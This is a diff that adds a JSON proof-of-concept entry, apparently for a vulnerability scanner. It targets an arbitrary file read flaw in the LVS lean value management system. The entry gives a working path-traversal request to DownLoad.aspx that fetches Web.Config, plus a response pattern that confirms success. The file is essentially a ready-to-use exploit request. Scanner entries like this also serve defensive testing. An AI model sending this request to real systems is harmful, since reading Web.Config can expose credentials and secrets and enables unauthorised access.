@@ -1,0 +1,14 @@
+{
+	"name":"LVS精益价值管理系统DownLoad.aspx任意文件读取",
+	"tag":"LVS",
+	"type":"other",
+	"poc":{
+		"pocGet":"/Business/DownLoad.aspx?p=UploadFile/../Web.Config",
+		"header":{
+			"User-Agent":"Mozilla/5.0 (Linux;",
+			"content-type":"text/plain"
+		},
+		"status_code":"200",
+		"pattern":"(configuration)"
+	}
+}
